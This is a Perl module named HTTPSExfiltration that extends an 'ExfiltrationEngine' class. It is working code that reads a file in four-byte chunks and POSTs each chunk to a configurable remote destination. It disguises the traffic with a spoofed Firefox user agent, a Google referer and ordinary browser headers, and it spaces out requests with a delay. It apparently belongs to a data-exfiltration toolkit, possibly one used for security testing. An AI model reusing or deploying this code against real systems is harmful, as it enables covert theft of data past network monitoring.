#!/usr/bin/perl

package HTTPSExfiltration;

require Entity::ExfiltrationEngine;

use Moose;
extends 'ExfiltrationEngine';

use LWP::UserAgent;
use MIME::Base64;

sub setHeader {
    my($req) = @_;

    $req->header('content-type' => 'application/json');
    $req->header('x-auth-token' => 'kfksj48sdfj4jd9d');
    $req->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    $req->header('Accept-Language' => 'en-US,en;q=0.5');
    $req->header('Accept-Encoding' => 'gzip, deflate, br');
    $req->header('Referer' => 'https://google.com/');
    $req->header('DNT' => '1');
    $req->header('Cache-Control' => 'max-age=0');
}

sub exfiltrate {
    my($self, $file) = @_;
    my($data, $n, $res);

    $self->SUPER::load($file);

    my $userAgent = new LWP::UserAgent;
    $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');

    my $request = new HTTP::Request 'POST' => $self->dest;

    setHeader($request);

    while (($n = read $self->file, $data, 4) != 0) {
        $request->content('{ "data": ' . $data . ' }');

        $res = $userAgent->request($request);
        sleep($self->delay);
    }

    $self->SUPER::close();
}

1;
